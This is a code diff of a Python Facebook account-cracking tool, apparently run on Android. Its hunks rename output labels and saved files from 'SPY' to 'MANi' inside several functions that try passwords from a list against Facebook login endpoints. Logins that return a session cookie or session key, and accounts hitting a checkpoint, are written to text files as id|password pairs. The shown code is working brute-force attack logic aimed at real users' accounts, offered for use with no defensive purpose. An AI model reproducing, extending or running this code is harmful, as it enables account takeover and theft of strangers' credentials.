@@ -250,15 +250,15 @@ def ffb(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [MANi-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/MANi-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [SPY-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [MANi-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/MANi-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -293,15 +293,15 @@ def ffb1(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [MANi-OK] %s | %s'%(ids,pas))
                                 #cek_apk(session,coki)
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/MANi-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [SPY-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [MANi-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/MANi-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -334,15 +334,15 @@ def ffb3(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [MANi-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/MANi-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [SPY-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [MANi-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/mani-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -376,15 +376,15 @@ def ffb4(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [MANi-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/MANi-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [SPY-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [mani-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/MaNi-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -446,15 +446,15 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [SPY-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [MANi-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/MANi-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [SPY-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [MaNi-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/MaNi-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -514,19 +514,19 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [SPY-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\033[1;32m [MANi-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/MANi-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [SPY-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r\x1b[38;5;126m [MANi-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open(f'/sdcard/MANi-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/SPY-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/MANi-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -570,15 +570,15 @@ def ffb7(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [SPY-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/SPY-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print(f'\r\r\033[1;32m [MaNi-OK] %s | %s'%(ids,pas))
+                                open(f'/sdcard/MaNi-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [SPY-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [MANi-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/MaNi-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -704,7 +704,7 @@ def rcrack_free(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
 				print('\n')
-				print('\033[1;92m[SPY-OK] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;92m[MANi-OK] '+idf+' | '+ps+'\033[0;97m')
 				cek_apk(coki)
 				open('ok.txt', 'a').write(idf+' | '+ps+'\n')
 				oks.append(idf)
@@ -713,7 +713,7 @@ def rcrack_free(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print('\n')
-				print('\033[1;91m[SPY-CP] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;91m[MANi-CP] '+idf+' | '+ps+'\033[0;97m')
 				open('cp.txt', 'a').write(idf+' | '+ps+'\n')
 				cps.append(idf)
 				break
@@ -779,18 +779,18 @@ def apix(ids,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         print(f'\r\r\033[1;32m [MANi-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/SPY-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open(f'/sdcard/mani-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
                                                 print(f'\r\r\x1b[38;5;126m [MaNi-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/SPY-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/mani-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open(f'/sdcard/SPY-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/mani-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
